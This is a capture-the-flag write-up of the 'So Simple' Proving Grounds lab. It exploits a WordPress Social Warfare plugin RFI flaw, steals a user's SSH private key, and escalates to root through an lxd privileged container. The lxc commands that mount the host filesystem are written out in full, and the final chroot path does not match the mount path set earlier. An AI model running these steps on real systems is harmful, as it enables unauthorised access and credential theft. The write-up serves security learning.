* * *
 ### LAB: SO SIMPLE
 ### PLATFORM: PROVING GROUNDS
* * *

- Rustscan's details

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/583ce09b-3d2e-469c-8439-628f7c7c3030)

- FFuf spotted a wordpress directory    


- Scanning with `wpscan --url <url>` for information about the wordpress site and a particular plugin caught my attention which is the `social warfare wp plugin`

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/37b131e1-0088-4bc5-bb3e-5ada1bbeae4f) 
  
- `Social warfare 3.5.0` has an unauthenticated remote code execution flaw via Remote File Inclusion.I wrote an exploit for it

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4bec41f2-29fa-408b-ae90-a2693dfef8bd)
  
- Now we have a stabilied shell

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d19b707b-33d6-416d-98de-a1ba6822de1f)  

### Road to PRIVESC 

- One of the user Max has a private key in his `.ssh` directory

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/63442927-533b-4cb6-b500-e2c243f89549)

- We can send the file with python http.server to our machine, change permissions with `chmod 600 <id_rsa>` and ssh to max's account

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cfb16a3d-6959-4588-8fdd-de9a3a2c6afe)
  

### Privilege escalation with lxd user

- I ran `id` and discovered that his account is part of the user group,we can escalate privileges by creating a misconfigured container lxc
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/daa34c20-99a8-424c-a5f4-25111ffdb8b8) 
  

- I ran this bash one-liner `cat /etc/passwd | grep "lxd"` to check if lxd is a user

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cd539238-3616-42ca-ab70-4cdb8f471882)
  

- I checked if lxd has a running process with `ps -ef | grep -i "lxd\|lxc"`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cabd4c6b-d5f4-47ff-8a40-99b855d37f38)   

- I used this commands to build an lxd image as root on the host machine

      git clone https://github.com/saghul/lxd-alpine-builder.git
      cd lxd-alpine-builder
      ./build-alpine

- Use a directory like `/dev/shm` or `/tmp` to receive the alpine image
- Set up a python http server and send the recent image

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3d54e4a2-233d-4cfe-b4bd-fce90a703b06)  

- Receive it on `/tmp/` to initialize the image

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4ea75f7d-8504-43fa-a3dd-801f02bc7236)
  

- Create a storage pool with `lxd init`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b4dac9c1-aef5-4e62-aa18-43286b897811)  

- Import the image with this command

       lxc image import alpine-v3.16-x86_64-20221112_0508.tar.gz --alias alpine

- List images with

      lxc image list

- Use the commands below to initialize the images in /tmp 

      lxc init alpine juggernaut -c security.privileged=true
      lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
      lxc start juggernaut
      lxc list
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/23511f48-5d10-481d-aa8d-f120e604ea71)
  

 - To execute the container use `lxc exec juggernaut sh`
 - Breakout with `chroot /root/mnt`,voila!!!, root accesss

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c47dde3e-73c5-4e02-a940-1630f4f613a4)


  
  

  
